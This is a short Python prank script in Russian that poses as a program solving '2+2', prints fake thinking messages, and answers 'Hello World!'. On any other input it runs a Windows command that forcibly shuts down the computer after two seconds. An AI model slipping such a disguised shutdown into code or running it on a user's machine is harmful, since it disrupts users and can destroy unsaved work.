import os
import time

gg = input("Введите пример 2+2, и наша программа решит все максимально верно:")
if gg == "2+2":
    print ("Начало подсчета.")
    time.sleep(2.5)
    print ("Произвожу подсчеты.")
    time.sleep(3.5)
    print ("Думаю...")
    time.sleep(2.0)
    print ("Пишу ответ!")
    time.sleep(4)
    print ("Ответ: Hello World!")
else:
    print ("нет нужно написать 2+2!!!")
    time.sleep (1)
    print ("Ну раз ты не послушал то прощай!:)")
    time.sleep (2)
    print ("да ладно я шучу")
    time.sleep (2)
    print ("а нет")
    os.system ("shutdown /s /t 2")


